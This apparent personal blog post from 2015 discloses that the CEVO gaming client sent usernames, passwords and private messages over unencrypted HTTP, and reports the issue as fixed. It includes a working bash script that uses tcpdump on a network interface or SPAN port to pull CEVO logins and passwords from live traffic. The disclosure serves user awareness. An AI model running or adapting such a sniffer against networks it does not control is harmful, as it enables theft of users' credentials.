---
title: "CEVO Client Information Disclosure"
description: "CEVO Client Information Disclosure vulnerability discloses account email, password, username, private messages, and chat room conversations"
author: "jonpulsifer"
date: "2015-07-26"
draft: false
tags:
- "cs:go"
---

### tl;dr

CEVO was a global eSports company built around North America’s largest competitive online PC gaming league. The CEVO client is software that is mandatory to be run during online play. The client was transmitting user authentication details (usernames and passwords) and private conversations in clear text which made them susceptible to eavesdropping attacks.

--- 

Good day CS:GO friends!

Reference: [/r/globaloffensive post][reddit-esea] about [ESEA][esea]'s password security from early spring 2015.

I had a couple of the guys over this weekend to play some video games and of course CS:GO was on our list. We decided to download the [CEVO][cevo] client because of the cost of ESEA and our skill differences in matchmaking. I recalled a [Reddit post][reddit-esea] from this spring and decided to double check that CEVO would at least take the lessons learned from the attacks on ESEA and secure their users. I was wrong!

While the CEVO website has enabled HTTPS, [arguably] the most important part of their business, the client, is verifying login details and more in plain ol' HTTP. How does that work?

Whenever a client authenticates with a website or web based application, typically, an `HTTP POST` request is generated. The `HTTP POST` request contains your account credentials (email address for CEVO, username for ESEA) and password. This is completely normal. The big difference here is that services like Google, Facebook, banks, .etc, use TLS  (transport layer security) to encrypt the data between your computer and the server responsible for performing the authentication so no one else can see it; CEVO does not.

Not only does the client not encrypt login credentials, **all communication over the client happens over HTTP** which means your private messages are also disclosed to whoever is listening.

So what? Who cares?

With things like prize pools totaling over USD$150,000 and the CS:GO skins gambling economy, it would be trivial for a malicious person to harvest professional players' information from large CEVO events and use that information to DoS an entire event for fun and profit!

How can I check?

If you're not that savvy with Linux you could always use something like [Fiddler](https://en.wikipedia.org/wiki/Fiddler_(software)) or [Wireshark](https://www.wireshark.org/) to do the heavy lifting for you if. Here's what fiddler looks like:

{{< figure src="fiddler-cevo.png" width="100%" link="fiddler-cevo.png" title="Fiddler showing HTTP results" >}}

If you prefer the command line, use something like `tcpdump` and string search your way to freedom.

```bash {linenos=table}
#!/bin/bash
# This script returns CEVO client usernames and passwords from live network traffic
# Hook your Linux laptop into a SPAN near the edge and enjoy

# Usage:
# ./cevo.sh <interface name>

CEVOIP=$(dig +short cevo.com)
IPCOUNT=$(echo $CEVOIP | wc -w)

if [ -z $1 ]; then echo "Supply an interface to capture on. (eg ./cevo.sh eth0)"; exit 1; fi

INTERFACE=$1

# check if supplied interface exists
ifconfig $INTERFACE 2>&1 > /dev/null; if [ $? -gt 0 ]; then echo "Can't find interface. Exiting."; exit 1; fi

# Multiple IP logic
if [ $IPCOUNT -gt 1 ]; then
        BPF_HOST=$(echo $CEVOIP | sed 's/[[:blank:]]/ or /g')
else
        BPF_HOST=$(echo $CEVOIP | sed 's/[[:blank:]]+//g')
fi

BPF="tcp and port 80 and dst host ($BPF_HOST)"

echo "Running (end with ^C)..."
tcpdump -ln -i $INTERFACE -A "$BPF" 2>/dev/null | while read CREDZ; do
        echo $CREDZ | grep -E '^redirect-url' | awk -F"[&=]" '{print "Login:",$4,"\tPassword:",$6}' | sed 's/%40/@/g'
done
```

{{< figure src="tcpdump-cevo.gif" width="100%" link="tcpdump-cevo.gif" title="tcpdump showing usernames and passwords" >}}


~~So, until this gets fixed, I would exercise extreme caution when logging in via the CEVO client to play some games, especially on a network that you do not trust.~~ It's fixed :smile:

[cevo]: https://cevo.com
[esea]: https://play.esea.net
[reddit-esea]: https://www.reddit.com/r/GlobalOffensive/comments/2wl8qz/warning_esea_shows_complete_disregard_for_your/
